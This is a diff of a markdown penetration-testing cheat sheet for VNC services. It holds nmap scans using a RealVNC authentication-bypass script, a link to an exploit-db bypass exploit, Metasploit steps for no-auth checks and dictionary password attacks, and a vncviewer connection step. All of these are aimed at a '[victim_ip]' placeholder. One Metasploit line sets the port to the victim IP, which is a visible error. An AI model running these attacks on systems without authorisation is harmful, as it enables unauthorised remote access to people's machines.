@@ -1,9 +1,41 @@
+### Virtual Network Computing (VNC)
+Gaphical desktop sharing system that uses the Remote Frame Buffer protocol (RFB) to remotely control another computer. It transmits the keyboard and mouse events from one computer to another. 
+
 ### nmap scan with nse script
 ```
-nmap -sV -script realvnc-auth-bypass.nse [victim_ip] -p 5900
+nmap -sV --script realvnc-auth-bypass.nse [victim_ip] -p 5900
+
+nmap --script vnc-info [victim_ip] -p 5901
 ```
 
-##### Authentication Bypass exploit (version RealVNC 4.1.0/4.1.1)
+### Authentication Bypass exploit (version RealVNC 4.1.0/4.1.1)
 ```
 https://www.exploit-db.com/exploits/36932
 ```
+
+### MSF VNC auth check with none scanner
+```
+msf > use auxiliary/scanner/vnc/vnc_none_auth
+msf > set RHOSTS [target_ip]
+msf > set THREADS [int]
+msf > run
+```
+
+### MSF VNC Password attack
+```
+msf > use auxiliary/scanner/vnc/vnc_login
+msf > set rhosts [victim_ip]
+msf > set rport [victim_ip
+msf > set pass_file /your/dictionary/file
+msf > run
+```
+
+### VNC access
+```
+vncviewer [victim_ip]:[victim_port]
+```
+
+#### References
+- https://en.wikipedia.org/wiki/Virtual_Network_Computing
+- https://www.offensive-security.com/metasploit-unleashed/vnc-authentication/
+- https://www.hackingarticles.in/vnc-penetration-testing/
